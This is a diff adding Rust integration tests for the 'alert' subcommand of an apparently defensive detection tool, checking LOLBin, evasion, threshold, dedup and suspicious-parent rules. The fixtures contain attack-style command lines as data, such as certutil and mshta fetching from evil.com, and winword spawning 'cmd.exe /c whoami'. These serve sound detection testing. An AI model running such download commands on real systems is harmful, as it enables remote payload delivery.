@@ -1,6 +1,7 @@
 use assert_cmd::Command;
 use predicates::prelude::*;
 use std::fs;
+use std::io::Write;
 use tempfile::TempDir;
 
 fn cmd() -> Command {
@@ -1152,7 +1153,7 @@ fn tail_picks_up_appended_events() {
         .unwrap();
 
     // Give tail a moment to start and seek to end
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_secs(2));
 
     // Append events to the file
     {
@@ -1195,7 +1196,7 @@ fn tail_applies_filters() {
         .spawn()
         .unwrap();
 
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_secs(2));
 
     // Append both Info and High events
     {
@@ -1251,7 +1252,7 @@ fn tail_skips_existing_content() {
         .spawn()
         .unwrap();
 
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_secs(2));
 
     // Append a new event
     {
@@ -1303,7 +1304,7 @@ fn tail_survives_file_rotation() {
         .spawn()
         .unwrap();
 
-    std::thread::sleep(std::time::Duration::from_millis(500));
+    std::thread::sleep(std::time::Duration::from_secs(2));
 
     // Simulate file rotation: rename the current file and create a new one
     let rotated = dir.path().join("events.jsonl.1");
@@ -2613,4 +2614,447 @@ fn score_limit_respected() {
     let stdout = String::from_utf8(output.stdout).unwrap();
     let parsed: serde_json::Value = serde_json::from_str(&stdout).unwrap();
     assert_eq!(parsed["scored_processes"].as_array().unwrap().len(), 2);
+}
+
+// ---------------------------------------------------------------------------
+// Alert subcommand tests
+// ---------------------------------------------------------------------------
+
+#[test]
+fn help_shows_alert_subcommand() {
+    cmd()
+        .arg("--help")
+        .assert()
+        .success()
+        .stdout(predicate::str::contains("alert"));
+}
+
+#[test]
+fn alert_help() {
+    cmd().args(["alert", "--help"]).assert().success().stdout(
+        predicate::str::contains("--input")
+            .and(predicate::str::contains("--threshold"))
+            .and(predicate::str::contains("--cooldown"))
+            .and(predicate::str::contains("--json")),
+    );
+}
+
+#[test]
+fn alert_detects_lolbin() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+
+    // Create file with initial content (alert seeks to end).
+    fs::write(&path, "").unwrap();
+
+    // Spawn alert process.
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", path.to_str().unwrap(), "--json"])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    // Give it a moment to start and seek to end.
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    // Append a LOLBin ProcessCreate event.
+    let event = sample_process_create_key(
+        "b0000000-0000-0000-0000-000000000001",
+        200, 1,
+        "C:/Windows/System32/certutil.exe",
+        "certutil.exe -urlcache http://evil.com",
+        "2026-03-13T10:00:00Z",
+        "200:5000",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event}").unwrap();
+    }
+
+    // Wait for alert to process.
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    assert!(stdout.contains("lolbin"), "expected lolbin alert, got: {stdout}");
+    // Verify JSON parseable
+    for line in stdout.lines() {
+        let parsed: serde_json::Value = serde_json::from_str(line).unwrap();
+        assert_eq!(parsed["rule"], "lolbin");
+        assert_eq!(parsed["pid"], 200);
+        assert!(parsed["process_key"].as_str().unwrap().contains("200"));
+    }
+}
+
+#[test]
+fn alert_detects_evasion() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", path.to_str().unwrap(), "--json"])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    let event = sample_detection_event(
+        "b1000000-0000-0000-0000-000000000001",
+        "TF-EVA-001",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    assert!(stdout.contains("TF-EVA-001"), "expected detection alert, got: {stdout}");
+    let parsed: serde_json::Value = serde_json::from_str(stdout.lines().next().unwrap()).unwrap();
+    assert_eq!(parsed["alert_type"], "detection");
+    assert_eq!(parsed["rule"], "TF-EVA-001");
+}
+
+#[test]
+fn alert_score_threshold() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    // Use threshold=40 (default). A single detection = 40 points → triggers.
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", path.to_str().unwrap(),
+        "--threshold", "40", "--json",
+    ])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    let event = sample_detection_event(
+        "b2000000-0000-0000-0000-000000000001",
+        "TF-EVA-002",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    // Should have both a detection alert and a score-threshold alert.
+    let lines: Vec<&str> = stdout.lines().collect();
+    assert!(lines.len() >= 2, "expected detection + score alerts, got {} lines: {stdout}", lines.len());
+
+    let has_detection = lines.iter().any(|l| {
+        let v: serde_json::Value = serde_json::from_str(l).unwrap();
+        v["alert_type"] == "detection"
+    });
+    let has_score = lines.iter().any(|l| {
+        let v: serde_json::Value = serde_json::from_str(l).unwrap();
+        v["alert_type"] == "score"
+    });
+    assert!(has_detection, "missing detection alert");
+    assert!(has_score, "missing score-threshold alert");
+}
+
+#[test]
+fn alert_dedup_suppresses_repeat() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", path.to_str().unwrap(),
+        "--cooldown", "300", "--json",
+    ])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    // Write the same detection event twice.
+    let event = sample_detection_event(
+        "b3000000-0000-0000-0000-000000000001",
+        "TF-EVA-003",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event}").unwrap();
+    }
+    std::thread::sleep(std::time::Duration::from_secs(2));
+    // Second occurrence with different event ID but same rule + process.
+    let event2 = sample_detection_event(
+        "b3000000-0000-0000-0000-000000000002",
+        "TF-EVA-003",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event2}").unwrap();
+    }
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    // Count detection alerts (not score-threshold ones).
+    let detection_lines: Vec<&str> = stdout.lines().filter(|l| {
+        let v: serde_json::Value = serde_json::from_str(l).unwrap();
+        v["alert_type"] == "detection"
+    }).collect();
+
+    // Should be exactly 1 — the second is suppressed by cooldown.
+    assert_eq!(
+        detection_lines.len(), 1,
+        "expected 1 detection alert (dedup), got {}: {stdout}",
+        detection_lines.len(),
+    );
+}
+
+#[test]
+fn alert_human_readable_output() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", path.to_str().unwrap()])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    let event = sample_process_create_key(
+        "b4000000-0000-0000-0000-000000000001",
+        300, 1,
+        "C:/Windows/System32/mshta.exe",
+        "mshta.exe http://evil.com",
+        "2026-03-13T10:00:00Z",
+        "300:6000",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    // Human-readable output should have severity and rule name.
+    assert!(stdout.contains("HUNT"), "expected HUNT label, got: {stdout}");
+    assert!(stdout.contains("lolbin"), "expected lolbin rule, got: {stdout}");
+    assert!(stdout.contains("mshta.exe"), "expected process name, got: {stdout}");
+}
+
+#[test]
+fn alert_suspicious_parent() {
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", path.to_str().unwrap(), "--json"])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    // First: parent process (winword.exe)
+    let parent = sample_process_create_key(
+        "b5000000-0000-0000-0000-000000000001",
+        400, 1,
+        "C:/Program Files/Microsoft Office/winword.exe",
+        "winword.exe doc.docx",
+        "2026-03-13T10:00:00Z",
+        "400:7000",
+    );
+    // Then: child process (cmd.exe spawned by winword pid=400)
+    let child_event = sample_process_create_key(
+        "b5000000-0000-0000-0000-000000000002",
+        401, 400,
+        "C:/Windows/System32/cmd.exe",
+        "cmd.exe /c whoami",
+        "2026-03-13T10:00:01Z",
+        "401:7001",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{parent}").unwrap();
+        writeln!(f, "{child_event}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    let has_suspicious = stdout.lines().any(|l| {
+        if let Ok(v) = serde_json::from_str::<serde_json::Value>(l) {
+            v["rule"] == "suspicious-parent"
+        } else {
+            false
+        }
+    });
+    assert!(has_suspicious, "expected suspicious-parent alert, got: {stdout}");
+}
+
+#[test]
+fn alert_suspicious_parent_child_before_parent() {
+    // Child ProcessCreate arrives BEFORE parent — retroactive detection.
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args(["alert", "--input", path.to_str().unwrap(), "--json"])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    // Child first (cmd.exe with ppid=500), then parent (winword.exe pid=500).
+    let child_event = sample_process_create_key(
+        "c0000000-0000-0000-0000-000000000001",
+        501, 500,
+        "C:/Windows/System32/cmd.exe",
+        "cmd.exe /c whoami",
+        "2026-03-13T10:00:00Z",
+        "501:8001",
+    );
+    let parent = sample_process_create_key(
+        "c0000000-0000-0000-0000-000000000002",
+        500, 1,
+        "C:/Program Files/Microsoft Office/winword.exe",
+        "winword.exe doc.docx",
+        "2026-03-13T09:59:00Z",
+        "500:8000",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        // Child arrives first!
+        writeln!(f, "{child_event}").unwrap();
+        writeln!(f, "{parent}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    let has_suspicious = stdout.lines().any(|l| {
+        if let Ok(v) = serde_json::from_str::<serde_json::Value>(l) {
+            v["rule"] == "suspicious-parent"
+        } else {
+            false
+        }
+    });
+    assert!(
+        has_suspicious,
+        "expected suspicious-parent alert even when child arrives before parent, got: {stdout}",
+    );
+}
+
+#[test]
+fn alert_score_threshold_re_notifies_after_cooldown() {
+    // Score threshold should re-fire after cooldown expires.
+    let dir = TempDir::new().unwrap();
+    let path = dir.path().join("events.jsonl");
+    fs::write(&path, "").unwrap();
+
+    // Use a very short cooldown (1 second).
+    let mut child = std::process::Command::new(
+        assert_cmd::cargo::cargo_bin("threatfalcon"),
+    )
+    .args([
+        "alert", "--input", path.to_str().unwrap(),
+        "--threshold", "40", "--cooldown", "1", "--json",
+    ])
+    .stdout(std::process::Stdio::piped())
+    .stderr(std::process::Stdio::piped())
+    .spawn()
+    .unwrap();
+
+    std::thread::sleep(std::time::Duration::from_secs(2));
+
+    // First detection (40 pts → triggers threshold).
+    let event1 = sample_detection_event(
+        "d0000000-0000-0000-0000-000000000001",
+        "TF-EVA-001",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event1}").unwrap();
+    }
+
+    // Wait for cooldown to expire (1s cooldown + margin).
+    std::thread::sleep(std::time::Duration::from_secs(3));
+
+    // Second detection (score now 80 → should re-trigger threshold).
+    let event2 = sample_detection_event(
+        "d0000000-0000-0000-0000-000000000002",
+        "TF-EVA-002",
+    );
+    {
+        let mut f = std::fs::OpenOptions::new().append(true).open(&path).unwrap();
+        writeln!(f, "{event2}").unwrap();
+    }
+
+    std::thread::sleep(std::time::Duration::from_secs(3));
+    child.kill().unwrap();
+    let output = child.wait_with_output().unwrap();
+    let stdout = String::from_utf8(output.stdout).unwrap();
+
+    let score_alerts: Vec<&str> = stdout.lines().filter(|l| {
+        if let Ok(v) = serde_json::from_str::<serde_json::Value>(l) {
+            v["alert_type"] == "score"
+        } else {
+            false
+        }
+    }).collect();
+
+    assert!(
+        score_alerts.len() >= 2,
+        "expected score-threshold to re-fire after cooldown, got {} score alerts: {stdout}",
+        score_alerts.len(),
+    );
 }
